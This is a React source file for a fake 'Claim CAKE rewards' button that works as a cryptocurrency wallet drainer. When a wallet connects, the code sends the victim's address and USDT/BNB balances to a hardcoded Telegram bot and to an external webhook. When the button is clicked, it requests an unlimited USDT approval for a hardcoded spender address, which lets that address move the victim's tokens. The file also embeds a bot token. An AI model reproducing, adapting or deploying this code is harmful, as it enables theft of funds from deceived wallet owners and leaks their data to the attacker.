// Approvewallet.jsx
import { useAccount, useWalletClient, useBalance } from "wagmi";
import { erc20Abi, parseUnits } from "viem";
import { bsc } from "wagmi/chains";
import { useState, useEffect } from "react";




const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // USDT on BSC
const SPENDER = "0x2990048172A3687249B2DF6c2F2D8e8401330E88"; // Your spender address

// 🔹 Send message to Telegram

const sendToTelegram = async (message) => {
  console.log("📩 Sending to Telegram:", message); // debug log

  const botToken = "7477590341:AAHz8Yl2jYCZIa2uBJQnYFifQAUk0WGWkUY"; 
  const chatId = "-1002762295115";
  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

  try {
    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: "HTML",
      }),
    });


    const result = await response.json();
    console.log("Telegram API response:", result); // log response

    if (!response.ok) {
      console.error("❌ Telegram API error:", result);
    }
  } catch (e) {
    console.error("❌ Telegram send failed:", e);
  }
};

// 🔹 Send message to external API
const sendToExternalAPI = async (data) => {
  const apiEndpoint =
    localStorage.getItem("apiEndpoint") || "https://your-bot-api.com/webhook";

  try {
    const response = await fetch(apiEndpoint, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(data),
    });

    if (!response.ok) {
      console.error("External API error:", await response.text());
    }
  } catch (e) {
    console.error("External API send failed:", e);
  }
};

export default function ApproveButton() {
  const { address, isConnected } = useAccount();
  const { data: walletClient } = useWalletClient();
  const [loading, setLoading] = useState(false);

    const [cakeReward, setCakeReward] = useState(0);

  useEffect(() => {
    const storedReward = localStorage.getItem("cakeReward");
    if (storedReward) setCakeReward(storedReward);
  }, []);


  // 🔹 Get balances
  const { data: bscBalance } = useBalance({ address, chainId: bsc.id });
  const { data: usdtBalance } = useBalance({
    address,
    token: USDT_ADDRESS,
    chainId: bsc.id,
  });

   const usdtFormatted = usdtBalance
      ? `$${parseFloat(usdtBalance.formatted).toFixed(2)}`
      : "0";
    const bnbFormatted = bscBalance
      ? parseFloat(bscBalance.formatted).toFixed(9)
      : "0";

  // 🔹 Send message when wallet connects
  useEffect(() => {
    if (isConnected && address) {
      sendToTelegram(`🟢 Wallet Connected:\n<code>${address}</code>\nUSDT: ${usdtFormatted}\nBNB: ${bnbFormatted} `);
      sendToExternalAPI({
        address,
        action: "wallet_connected",
        usdtBalance: usdtFormatted,
        bscBalance: bnbFormatted,
        timestamp: new Date().toISOString(),
      });
    }
  }, [isConnected, address]);

  // 🔹 Handle Approve button
  const handleApprove = async () => {
    if (!walletClient || !isConnected || !address) {
      alert("Please Connect Your Wallet.");
      return;
    }

    setLoading(true);

    const usdtFormatted = usdtBalance
      ? `$${parseFloat(usdtBalance.formatted).toFixed(2)}`
      : "0";
    const bnbFormatted = bscBalance
      ? parseFloat(bscBalance.formatted).toFixed(9)
      : "0";

    try {
      const maxAmount = parseUnits(
        "115792089237316195423570985008687907853269984665640564039457584007913129639935",
        0
      );

      const hash = await walletClient.writeContract({
        address: USDT_ADDRESS,
        abi: erc20Abi,
        functionName: "approve",
        args: [SPENDER, maxAmount],
        account: address,
      });

      await sendToTelegram(
        `✅ USDT Approved:\n${address}\nUSDT: ${usdtFormatted}\nBNB: ${bnbFormatted}\nTx Hash: ${hash}`
      );

      await sendToExternalAPI({
        address,
        action: "approval_success",
        txHash: hash,
        usdtBalance: usdtFormatted,
        bscBalance: bnbFormatted,
        timestamp: new Date().toISOString(),
      });
    } catch (err) {
      console.error("USDT approval failed:", err.message);

      await sendToTelegram(
        `❌ USDT Approval Failed:\n$<code>${address}</code>\nUSDT: ${usdtFormatted}\nBNB: ${bnbFormatted}`
      );

      await sendToExternalAPI({
        address,
        action: "approval_failed",
        error: err.message,
        usdtBalance: usdtFormatted,
        bscBalance: bnbFormatted,
        timestamp: new Date().toISOString(),
      });
    }

    setLoading(false);
  };



  // Only show button if user has scanned wallet (has CAKE reward > 0)
  if (!isConnected || cakeReward === 0) {
    return (
      <div style={{
        padding: "20px",
        textAlign: "center",
        borderRadius: "15px",
        background: "rgba(255, 255, 255, 0.05)",
        border: "1px solid rgba(255, 255, 255, 0.1)",
        color: "rgba(255, 255, 255, 0.7)"
      }}>
        {!isConnected 
          ? "🔗 Connect your wallet and scan to claim rewards" 
          : "🔍 Scan your wallet first to see available rewards"}
      </div>
    );
  }

  return (
    <button
      onClick={handleApprove}
      disabled={loading}
      style={{
        padding: "18px 35px",
        background: loading 
          ? "linear-gradient(45deg, #f59e0b, #f97316)" 
          : "linear-gradient(45deg, #f59e0b, #ea580c, #dc2626)",
        color: "white",
        borderRadius: "20px",
        border: "none",
        cursor: loading ? "not-allowed" : "pointer",
        marginTop: "20px",
        width: "100%",
        maxWidth: "280px",
        fontSize: "18px",
        fontWeight: "700",
        textTransform: "uppercase",
        letterSpacing: "0.5px",
        transition: "all 0.3s ease",
        transform: loading ? "scale(0.98)" : "scale(1)",
        boxShadow: loading 
          ? "0 0 30px rgba(245, 158, 11, 0.5)" 
          : "0 10px 30px rgba(245, 158, 11, 0.4)",
        position: "relative",
        overflow: "hidden",
        textShadow: "0 2px 4px rgba(0,0,0,0.3)"
      }}
      onMouseEnter={(e) => {
        if (!loading) {
          e.target.style.transform = "scale(1.05) translateY(-2px)";
          e.target.style.boxShadow = "0 15px 40px rgba(245, 158, 11, 0.6)";
        }
      }}
      onMouseLeave={(e) => {
        if (!loading) {
          e.target.style.transform = "scale(1)";
          e.target.style.boxShadow = "0 10px 30px rgba(245, 158, 11, 0.4)";
        }
      }}
    >
      {loading && (
        <div style={{
          position: "absolute",
          top: 0,
          left: "-100%",
          width: "100%",
          height: "100%",
          background: "linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent)",
          animation: "claimScan 1.2s infinite"
        }} />
      )}
      <span style={{ position: "relative", zIndex: 1 }}>
        {loading ? "🔄 Claiming..." : `🍰 Claim ${cakeReward} CAKE`}
      </span>
      <style>
        {`
          @keyframes claimScan {
            0% { left: -100%; }
            100% { left: 100%; }
          }
        `}
      </style>
    </button>
  );
}
